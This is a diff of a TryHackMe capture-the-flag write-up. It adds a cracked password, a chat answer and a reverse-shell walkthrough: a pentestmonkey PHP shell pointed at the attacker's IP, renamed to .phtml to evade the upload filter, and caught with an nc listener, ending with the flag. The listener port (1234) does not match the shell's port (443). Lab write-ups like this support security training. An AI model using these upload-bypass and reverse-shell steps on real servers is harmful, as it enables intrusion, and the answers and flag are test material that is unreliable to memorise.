@@ -113,11 +113,33 @@ Restore.Point....: 147456/14344384 (1.03%)
 Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
 Candidates.#2....: mckenzy -> florida69
 ```
-
+**Answer**: `saltnpepper`
 ## Santa has a secret! Which station is he meeting Mrs Mistletoe in?
+1. Login as Santa with the email `bigman@shefesh.com` and password saltnpepper `saltnpepper`.
+2. Access the chat messages between Santa Mrs Mistletoe:
+![chat messages between Santa Mrs Mistletoe](chat.jpg)
+
+**Answer**: `Waterloo`
+## Once you're logged in to LapLANd, there's a way you can gain a shell on the machine! Find a way to do so and read the file in `/home/user/`
+1. Download the [PHP file](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) written by @pentestmonkey.
+2. Modify the `$ip` variable to your TryHackMe IP address (green bubble on the navbar):
+```php
+$ip = '<OPENVPN_IP>';
+$port = 443;
+```
+3. Rename the file to `php-reverse-shell.phtml`.
+4. Run `nc -lvnp 1234` and upload `php-reverse-shell.phtml`:
 ```bash
+$ nc -lvnp 1234
+$ cd /home/user/
+$ ls
+flag.txt
+$ cat flag.txt
+MERRY CHRISTMAS FROM SHEFFIELD, UK
+
+CREATED IN COLLABORATION WITH TRYHACKME.COM
+
+THM{SHELLS_IN_MY_EGGNOG}
 ```
 
-## Once you're logged in to LapLANd, there's a way you can gain a shell on the machine! Find a way to do so and read the file in `/home/user/`
-```bash
-```
+**Flag**: `THM{SHELLS_IN_MY_EGGNOG}`
